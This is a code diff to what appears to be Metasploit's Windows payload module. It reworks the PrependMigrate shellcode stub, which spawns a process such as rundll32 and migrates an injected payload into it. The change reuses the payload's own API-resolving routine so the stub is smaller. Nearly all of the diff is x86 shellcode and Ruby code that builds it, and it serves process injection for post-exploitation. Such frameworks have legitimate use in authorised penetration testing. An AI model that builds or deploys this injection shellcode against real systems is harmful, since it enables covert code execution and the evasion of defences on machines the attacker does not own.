@@ -79,9 +79,11 @@ module Msf::Payload::Windows
 				payloadsize = "0x%04x" % buf.length
 				procname = datastore['PrependMigrateProc'] || 'rundll32'
 
-				migrate_asm = <<EOS
-  cld                       ; Clear the direction flag.
-  call start                ; Call start, this pushes the address of 'api_call' onto the stack.
+				# Prepare instructions to get address of block_api into ebp
+				block_api_start = <<EOS
+  call start
+EOS
+				block_api_asm = <<EOS
 api_call:
   pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
   mov ebp, esp              ; Create a new stack frame
@@ -162,11 +164,43 @@ get_next_mod1:              ;
   pop edi                   ; Pop off the current (now the previous) modules hash
   pop edx                   ; Restore our position in the module list
   mov edx, [edx]            ; Get the next module
-  jmp next_mod              ; Process this module
+  jmp.i8 next_mod           ; Process this module
 ;--------------------------------------------------------------------------------------
-start:                      ;
+EOS
+				block_api_ebp_asm = <<EOS
   pop ebp                   ; Pop off the address of 'api_call' for calling later.
+EOS
+				block_close_to_payload = ''
 
+				# Check if we can find block_api in the payload
+				block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
+				block_api_index = buf.index(block_api)
+				if block_api_index
+
+					# Prepare instructions to calculate address
+					ebp_offset = "0x%04x" % (block_api_index + 5)
+					block_api_ebp_asm = <<EOS
+  jmp close_to_payload
+return_from_close_to_payload:
+  pop ebp
+  add ebp, #{ebp_offset}
+EOS
+					# Clear now-unneeded instructions
+					block_api_asm = ''
+					block_api_start = ''
+					block_close_to_payload = <<EOS
+close_to_payload:
+  call return_from_close_to_payload
+EOS
+				end
+
+				#put all pieces together
+				migrate_asm = <<EOS
+  cld                       ; Clear the direction flag.
+  #{block_api_start}
+  #{block_api_asm}
+start:
+  #{block_api_ebp_asm}
   ; get our own startupinfo at esp+0x60
   add esp,-400              ; adjust the stack to avoid corruption
   mov edx,esp
@@ -244,6 +278,7 @@ getcommand:
   call gotcommand
   db "#{procname}"
   db 0x00
+#{block_close_to_payload}
 begin_of_payload:
   call begin_of_payload_return
 EOS
@@ -251,7 +286,6 @@ EOS
 				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
 			end
 		end
-
 		return (pre + buf)
 	end
 
